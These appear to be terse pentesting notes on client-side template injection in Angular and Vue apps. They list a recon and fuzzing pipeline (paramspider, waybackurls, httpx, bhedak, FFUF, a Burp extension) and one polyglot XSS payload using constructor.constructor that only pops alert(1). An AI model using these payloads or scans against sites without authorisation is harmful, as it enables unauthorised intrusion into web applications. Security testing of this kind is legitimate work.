# CSTI

```
- angular -> directives: ng-* 
- vueJS 
    - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected
- paramspider/waybackurls -> httpx -> bhedak 
- https://github.com/R0X4R/bhedak
```

CSTI -> Reflected XSS

with inject payload we create reflected xss in CSTI. if we do not known target template engine we use polyglot payload

### polyglot payload

```
- polyglot -> "><img/src=x onerror=alert(1)>{{constructor.constructor('alert(1)')()}} -> <borna{{constructor.constructor('alert(1)')()}}
- FFUF
```

### automation

```
- FFUF -> Custom Send To Burp Externsion 
    - https://github.com/bytebutcher/burp-send-to
```

